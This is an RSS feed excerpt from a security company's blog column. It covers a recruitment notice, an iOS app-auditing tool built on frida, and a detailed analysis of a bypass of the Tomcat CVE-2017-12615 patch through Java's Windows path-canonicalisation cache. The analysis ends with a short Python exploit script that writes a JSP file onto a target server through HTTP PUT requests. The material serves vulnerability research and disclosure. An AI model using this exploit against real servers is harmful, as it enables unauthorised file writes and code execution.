更有毕业后直接转正的机会！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;友情提示：&lt;/p&gt;&lt;p&gt;长亭是一个对技术期望颇高的团队，&lt;/p&gt;&lt;p&gt;然而我们更看重的，&lt;/p&gt;&lt;p&gt;是你思考问题的思路，&lt;/p&gt;&lt;p&gt;看待世界的角度！&lt;/p&gt;&lt;p&gt;如果刚好你也这样，那就来吧！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;计算机专业的同学也不要自卑，&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;简历也不会被扔出去！&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;除了研发岗位，&lt;b&gt;市场、销售、技术支持&lt;/b&gt;等岗位也在期待你的加入！具体岗位信息请戳长亭科技官网（&lt;a href=&quot;https://chaitin.cn/cn/join-us.html&quot;&gt;https://chaitin.cn/cn/join-us.html&lt;/a&gt;）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;简历投递传送门：hr@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;邮件主题请注明 “CROSS计划”！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>朱文雷</author>
<guid isPermaLink="false">2017-10-27-30515472</guid>
<pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>开源！iOS 应用安全分析工具 Passionfruit</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-15-29761306.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;开源！iOS 应用安全分析工具 Passionfruit&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29761306&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e590742eb8fe8628767544ef478ee70d_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Github 项目地址 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;前情提要&lt;/h2&gt;&lt;p&gt;虽然没有 Android 平台那么多的攻击面和利用姿势，iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析。&lt;/p&gt;&lt;p&gt;针对 iOS 应用攻击面分析，目前笔者了解或使用过的相关工具如下（除去逆向工程使用的调试器和反汇编工具）：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Snoop-It（已停止维护）&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/dmayer/idb&quot;&gt;dmayer/idb&lt;/a&gt; idb is a tool to simplify some common tasks for iOS pentesting and research&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/mwrlabs/needle&quot;&gt;mwrlabs/needle&lt;/a&gt; The iOS Security Testing Framework&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/sensepost/objection&quot;&gt;sensepost/objection&lt;/a&gt; 📱 objection - runtime mobile exploration&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/iSECPartners/Introspy-iOS&quot;&gt;iSECPartners/Introspy-iOS&lt;/a&gt; IntroSpy&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在使用中笔者多多少少遇到了一些问题，例如 needle 在设备上需要部署过多依赖包，idb 不兼容 iOS 10，Introspy 虽好但查询日志数据库有一些麻烦……忍不住开始造轮子。&lt;/p&gt;&lt;p&gt;审计工具所需功能大体有如下几个方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;分析应用是否开启了必要的编译器保护&lt;/li&gt;&lt;li&gt;分析应用沙盒内的文件内容和权限&lt;/li&gt;&lt;li&gt;分析应用使用到的 framework 和动态链接库&lt;/li&gt;&lt;li&gt;分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain&lt;/li&gt;&lt;li&gt;分析剪贴板的使用&lt;/li&gt;&lt;li&gt;动态拦截和分析 Objective C 运行时方法&lt;/li&gt;&lt;li&gt;动态拦截和分析本地代码的参数调用和堆栈追踪&lt;/li&gt;&lt;li&gt;分析 UIView 的层级结构和属性&lt;/li&gt;&lt;li&gt;一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-869fa78c8cd0772eaf1d44711a7e471a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1556&quot;&gt;&lt;p&gt;&lt;i&gt;应用目前仍然在开发中，可能会有 bug 或功能缺失。&lt;/i&gt;&lt;/p&gt;&lt;h2&gt;设计&lt;/h2&gt;&lt;p&gt;在实现方案上，笔者选择了功能极为强大的 hook 框架 &lt;a href=&quot;https://www.frida.re/&quot;&gt;frida.re&lt;/a&gt;。关于这个框架不需要我再过多介绍，它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用，可以满足多种移动安全运行时分析的自动化需求。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b1570480dfb0ae145555cb3a44b73fe_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;318&quot;&gt;&lt;p&gt;Passionfruit 通过 frida 注入代码到目标应用实现功能，再通过 node.js 服务端消息代理与浏览器通信，用户通过访问网页即可对 App 实现常规的检测任务。&lt;/p&gt;&lt;h2&gt;安装和使用&lt;/h2&gt;&lt;p&gt;请访问 GitHub 上的项目主页 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt; 来获取最新的版本和更新信息。&lt;/p&gt;&lt;p&gt;Passionfruit 的编译和安装依赖如下软件：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nodejs.org/&quot;&gt;node.js&lt;/a&gt; 用于运行服务端。可根据个人喜好使用 &lt;a href=&quot;https://yarnpkg.com/&quot;&gt;yarn&lt;/a&gt; 或默认的 &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;npm&lt;/a&gt; 作为包管理&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/libimobiledevice/libimobiledevice&quot;&gt;libimobiledevice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;安装步骤&lt;/p&gt;&lt;ol&gt;&lt;li&gt;安装 node.js 和 libimobiledevice&lt;/li&gt;&lt;li&gt;通过 git 将代码仓库同步到本地&lt;/li&gt;&lt;li&gt;在越狱 iOS 设备上安装 frida&lt;/li&gt;&lt;li&gt;在非越狱设备上使用 ipa 重打包注入 fridagadget.dylib&lt;/li&gt;&lt;li&gt;第一次使用前，在代码根目录运行 npm run build 构建前端代码&lt;/li&gt;&lt;li&gt;运行 npm start 运行服务端，在浏览器中访问 localhost:31337&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;功能和演示&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;video id=&quot;None&quot; data-swfurl=&quot;&quot; poster=&quot;https://pic2.zhimg.com/80/v2-2f92b2ec64b187be4cbcaa134b697131_b.jpg&quot; data-sourceurl=&quot;https://www.zhihu.com/video/902688743067090944&quot; data-name=&quot;&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-lens-id=&quot;902688743067090944&quot;&gt;&lt;/video&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Passionfruit 最大特点就是基于 Web 的图形界面。因此你甚至可以在 iPad Pro 这样的移动设备上访问这个图形界面……（需要修改服务端监听的配置）&lt;/p&gt;&lt;p&gt;完全图形化的界面可以快速地找到需要 hook 的函数。由于 C 函数缺少运行时参数类型信息，因此对于这些库函数您需要手动设置一下函数原型。Objective C 可以直接根据反射打印出参数和返回值。&lt;/p&gt;&lt;p&gt;其他工具实现的 checksec 是基于 otool 检查应用的可执行文件，需要在设备上安装额外的依赖，或将文件从设备中同步到本地执行命令。Passionfruit 直接分析内存中映射的内容，因此要快上很多。在文件查看方面，Passionfruit 直接读取应用沙盒内的 Plist、SQLite 数据库，相比先 scp 下载然后查看可以节约一些时间。&lt;/p&gt;&lt;p&gt;Passionfruit 在不少界面都添加了搜索功能，如模块列表、导出符号、Objective C 类，甚至 Plist 这样的序列化数据。&lt;/p&gt;&lt;p&gt;在 iOS 10 中有一个非公开 API UIDebuggingInformationOverlay 可用来在设备上分析界面层级，您可以在 Passionfruit 的 UIDump 面板中点击按钮来激活这个界面。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5dac5ae80092b44c7e266b9aa4937a67_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;p&gt;如果您有单步、界面分析等更高级的调试需求，建议还是使用 debugserver 等专门的调试工具。&lt;/p&gt;&lt;h2&gt;FAQ&lt;/h2&gt;&lt;p&gt;&lt;b&gt;需要越狱吗？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;更新：项目发布后收到了 frida 作者本尊贡献的代码，现在已经不需要越狱了！&lt;/p&gt;&lt;p&gt;Frida 可以通过对已砸壳的 ipa 添加 fridagadget.dylib，重打包、重签名后在非越狱设备上试用，具体步骤可参考： &lt;a href=&quot;http://www.jianshu.com/p/ce2770c42ead&quot;&gt;iOS App的Patching和Resigning&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;为什么不支持 NSLog 查看？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;本工具使用的界面是基于浏览器的，对于 NSLog 日志这种快速刷新的内容，实时展示会造成显著的性能问题。在现有工具（Xcode，macOS 自带的 Console，libimoviledevice 的 idevicesyslog 命令）足够强大的情况下，没有必要再开发一个（更难用的）了。&lt;/p&gt;</description>
<author>周知日</author>
<guid isPermaLink="false">2017-10-15-29761306</guid>
<pubDate>Sun, 15 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-09-25-29649377.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29649377&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-30037f9018107abef8aa559996cbb61b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者：Pocky &lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 CVE-2017-12615 补丁分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;CVE-2017-12615 是 Tomcat 在设置了 readonly 为 false 状态下，可以通过 PUT 创建一个“.jsp ”的文件。由于后缀名非 .jsp 和 .jspx ，所以 Tomcat 在处理的时候经由 DefaultServlet 处理而不是 JspServlet ，又由于 Windows 不允许文件名为空格结尾，所以可以成功创建一个 JSP 文件，以达到 RCE 的结果。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;龙哥在周五敲我说，在高并发的情况下，还是可以成功写入一个 JSP 文件；同时微博上的一个小伙伴也告诉我，在一定的条件下还是可以成功创建文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;测试发现，对于 7.0.81 可以成功复现，但是对于 8.5.21 失败。如下代码分析是基于 Apache Tomcat 7.0.81 的。&lt;/b&gt;经过分析，我发现这两种情况其实本质是相同的。不过在此之前，首先看一下 Tomcat 对于 CVE-2017-12615 的补丁好了。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;同样的，进入 DefaultServlet 的 doPut 方法，再调用到 FileDirContext 的 bind 方法，接着调用 file 方法：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File file(String name, boolean mustExist) {
        File file = new File(base, name);
        return validate(file, mustExist, absoluteBase);
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;注意到 mustExist 为 false ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File validate(File file, boolean mustExist, String absoluteBase) {
    
        if (!mustExist || file.exists() &amp;amp;&amp;amp; file.canRead()) { // !mustExist = true，进入 if
            ...
            try {
                canPath = file.getCanonicalPath(); 
                // 此处，对路径进行规范化，调用的是 java.io.File 内的方法
                // 之前的 Payload 中结尾为空格，那么这个方法就会去掉空格
            } catch (IOException e) {
    
            }
            ...
            if ((absoluteBase.length() &amp;lt; absPath.length())
                &amp;amp;&amp;amp; (absoluteBase.length() &amp;lt; canPath.length())) {
                ...
                // 判断规范化的路径以及传入的路径是否相等，由于 canPath 没有空格，return null
                if (!canPath.equals(absPath))
                    return null;
            }
        } else {
            return null;
        }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;经过上述的判断，导致我们无法通过空格来创建 JSP 文件。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;但是之前提到，在高并发或者另外一种情况下，却又能创建 JSP 文件，也就是说 canPath.equals(absPath) 为 true 。通过深入分析，找出了其原因。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x02 WinNTFileSystem.canonicalize &lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上述代码中，对于路径的规范化是调用的 file.getCanonicalPath() ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public String getCanonicalPath() throws IOException {
        if (isInvalid()) {
            throw new IOException(&quot;Invalid file path&quot;);
        }
        return fs.canonicalize(fs.resolve(this));
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;也就是调用 FS 的 canonicalize 方法，对于 Windows，调用的是 WinNTFileSystem.canonicalize 。这个 Bypass 的锅也就出在 WinNTFileSystem.canonicalize 里，下面为其代码，我已去处掉了无关代码可以更清晰的了解原因。 &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
    public String canonicalize(String path) throws IOException {
        ...
        if (!useCanonCaches) { // !useCanonCaches = false
            return canonicalize0(path);
        } else {
            // 进入此处分支
            String res = cache.get(path);
            if (res == null) {
                String dir = null;
                String resDir = null;
                if (useCanonPrefixCache) {
                    dir = parentOrNull(path);
                    if (dir != null) {
                        resDir = prefixCache.get(dir);
                        if (resDir != null) {
                            String filename = path.substring(1 + dir.length());
                            // 此处 canonicalizeWithPrefix 不会去掉尾部空格
                            res = canonicalizeWithPrefix(resDir, filename);
                            cache.put(dir + File.separatorChar + filename, res);
                        }
                    }
                }
                if (res == null) {
                    // 此处的 canonicalize0 会将尾部空格去掉
                    res = canonicalize0(path);
                    cache.put(path, res);
                    if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                        resDir = parentOrNull(res);
                        if (resDir != null) {
                            File f = new File(res);
                            if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) {
                                prefixCache.put(dir, resDir);
                            }
                        }
                    }
                }
            }
            // 返回路径
            return res;
        }
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上述代码有一个非常非常神奇的地方：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;canonicalizeWithPrefix(resDir, filename) 不会去掉路径尾部空格&lt;/li&gt;&lt;li&gt;canonicalize0(path) 会去掉路径尾部空格&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;为了满足进入存在 canonicalizeWithPrefix 的分支，需要通过两个判断：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;String res = cache.get(path); 应为 null ，此处 PUT 一个从未 PUT 过的文件名即可&lt;/li&gt;&lt;li&gt;resDir = prefixCache.get(dir); 应不为 null&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;可以发现，对于 prefixCache 进行添加元素的操作在下方存在 canonicalize0 的 if 分支：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;           if (res == null) {
                res = canonicalize0(path);
                cache.put(path, res);
                if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                    resDir = parentOrNull(res);
                    if (resDir != null) {
                        File f = new File(res);
                        if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) { // 需要满足条件
                            prefixCache.put(dir, resDir); // 进行 put 操作&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过代码可知，如果想在 prefixCache 存入数据，需要满足&lt;b&gt;文件存在&lt;/b&gt;且&lt;b&gt;文件不是目录&lt;/b&gt;的条件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;prefixCache 存放的是什么数据呢？通过单步调试可以发现：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c3bda57d16a4c9ce6fd36f4fc5f06193_r.jpg&quot; data-rawwidth=&quot;657&quot; data-rawheight=&quot;250&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;resDir 为文件所在的绝对路径。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么如果想进入 canonicalizeWithPrefix 的分支，需要满足的两个条件已经理清楚了。从 prefixCache.put 开始，触发漏洞需要的流程如下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x03 The Exploit&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，要向 prefixCache 中添加内容，那么需要满足 f.exists() &amp;amp;&amp;amp; !f.isDirectory() 这个条件。仍然还是空格的锅：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe&quot;)
   True
   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe &quot;)
   True&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，在无已知文件的情况下，我们只需要先 PUT 创建一个 test.txt ，在 PUT  一个 test.txt%20 ，即可向 prefixCache 添加数据了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cf3dc76a2af468e27d8b2ffb05e5cf5d_r.jpg&quot; data-rawwidth=&quot;850&quot; data-rawheight=&quot;144&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c7469352b8428fc259cc53dc156aa20f_r.jpg&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;173&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;单步查看，发现已经通过分支，并且向 prefixCache 添加数据：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bff33dc63d977443793f73b01a09cd15_r.jpg&quot; data-rawwidth=&quot;992&quot; data-rawheight=&quot;467&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接着，创建一个 JSP 文件 “test.jsp%20” ，单步查看：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a7d81e24db7ee37733f7fcb497882f79_r.jpg&quot; data-rawwidth=&quot;884&quot; data-rawheight=&quot;625&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;可以发现，resDir 不为 null ，且 res 结尾带着空格。于是可以通过最开始的 canPath.equals(absPath) 的检查。查看 BurpSuite 中的返回：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6f70c318355bdc1b7c73ac6004204b32_r.jpg&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;181&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;发现已经创建成功了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Exploit:&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   import sys
   import requests
   import random
   import hashlib
   shell_content = &#39;&#39;&#39;
   RR is handsome!
   &#39;&#39;&#39;
   if len(sys.argv) &amp;lt;= 1:
       print(&#39;Usage: python tomcat.py [url]&#39;)
       exit(1)
   def main():
       filename = hashlib.md5(str(random.random())).hexdigest()[:6]
       put_url = &#39;{}/{}.txt&#39;.format(sys.argv[1], filename)
       shell_url = &#39;{}/{}.jsp&#39;.format(sys.argv[1], filename)
       requests.put(put_url, data=&#39;1&#39;)
       requests.put(put_url + &#39;%20&#39;, data=&#39;1&#39;)
       requests.put(shell_url + &#39;%20&#39;, data=shell_content)
       requests.delete(put_url)
       print(&#39;Shell URL: {}&#39;.format(shell_url))
   if __name__ == &#39;__main__&#39;:
       main()&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6734b1aa82d23171b2a2314fbbec15d3_r.jpg&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;209&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x04 Tomcat 8.5.21!?&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tomcat 8.5.21 通过 WebResourceRoot 来处理资源文件：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected transient WebResourceRoot resources = null;
   ...

   @Override
   protected void doPut(HttpServletRequest req, HttpServletResponse resp)
       throws ServletException, IOException {
       ...
       try {
           if (range != null) {
               File contentFile = executePartialPut(req, range, path);
               resourceInputStream = new FileInputStream(contentFile);
           } else {
               resourceInputStream = req.getInputStream();
           }

           if (resources.write(path, resourceInputStream, true)) { // 进入 write
               if (resource.exists()) {
                   resp.setStatus(HttpServletResponse.SC_NO_CONTENT);
               } else {
                   resp.setStatus(HttpServletResponse.SC_CREATED);
               }
           } else {&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接着调用 DirResourceSet.write ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       path = validate(path);
       if (!overwrite &amp;amp;&amp;amp; preResourceExists(path)) {
           return false;
       }
       // main 为 DirResourceSet 的 instance
       boolean writeResult = main.write(path, is, overwrite);
       ...
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;DirResourceSet.write 的源码为：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       checkPath(path);
       if (is == null) {
           throw new NullPointerException(
                   sm.getString(&quot;dirResourceSet.writeNpe&quot;));
       }
       if (isReadOnly()) {
           return false;
       }
       File dest = null;
       String webAppMount = getWebAppMount();
       if (path.startsWith(webAppMount)) {
           // 进入 file 方法
           dest = file(path.substring(webAppMount.length()), false);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;file 方法：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected final File file(String name, boolean mustExist) {
           ...
           String canPath = null;
           try {
               canPath = file.getCanonicalPath();
           } catch (IOException e) {
               // Ignore
           }
           ...
           if ((absoluteBase.length() &amp;lt; absPath.length())
               &amp;amp;&amp;amp; (canonicalBase.length() &amp;lt; canPath.length())) {
               ...
               if (!canPath.equals(absPath))
                   return null;
           }
       } else {
           return null;
       }
       return file;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;换汤不换药，为什么不能触发呢？经过单步，发现成功通过判断，但是在文件复制的时候出现了问题：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   try {
       if (overwrite) {
           Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING); // 此处
       } else {
           Files.copy(is, dest.toPath());
       }
   } catch (IOException ioe) {
       return false;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在 toPath 方法的时候出现了问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public Path toPath() {
       Path result = filePath;
       if (result == null) {
           synchronized (this) {
               result = filePath;
               if (result == null) {
                   result = FileSystems.getDefault().getPath(path);
                   filePath = result;
               }
           }
       }
       return result;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b5c33c929fd404a8c2e5e278f48e6d0_r.jpg&quot; data-rawwidth=&quot;998&quot; data-rawheight=&quot;241&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;WindowsPathParser.normalize 判断是是不是非法的字符：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static String normalize(StringBuilder sb, String path, int off) {
       ...
       while (off &amp;lt; len) {
           char c = path.charAt(off);
           if (isSlash(c)) {
               if (lastC == &#39; &#39;)
                   throw new InvalidPathException(path,
                                                  &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                                  off - 1);
           ...
           } else {
               if (isInvalidPathChar(c))
                   throw new InvalidPathException(path,
                                                  &quot;Illegal char &amp;lt;&quot; + c + &quot;&amp;gt;&quot;,
                                                  off);
               lastC = c;
               off++;
           }
       }
       if (start != off) {
           if (lastC == &#39; &#39;)
               throw new InvalidPathException(path,
                                              &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                              off - 1);
           sb.append(path, start, off);
       }
       return sb.toString();
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;以及：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static final boolean isInvalidPathChar(char var0) {
       return var0 &amp;lt; &#39; &#39; || &quot;&amp;lt;&amp;gt;:\&quot;|?*&quot;.indexOf(var0) != -1;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;难过。&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-09-25-29649377</guid>
<pubDate>Mon, 25 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈分布式渗透框架的架构与设计</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-08-25-28781870.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;浅谈分布式渗透框架的架构与设计&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
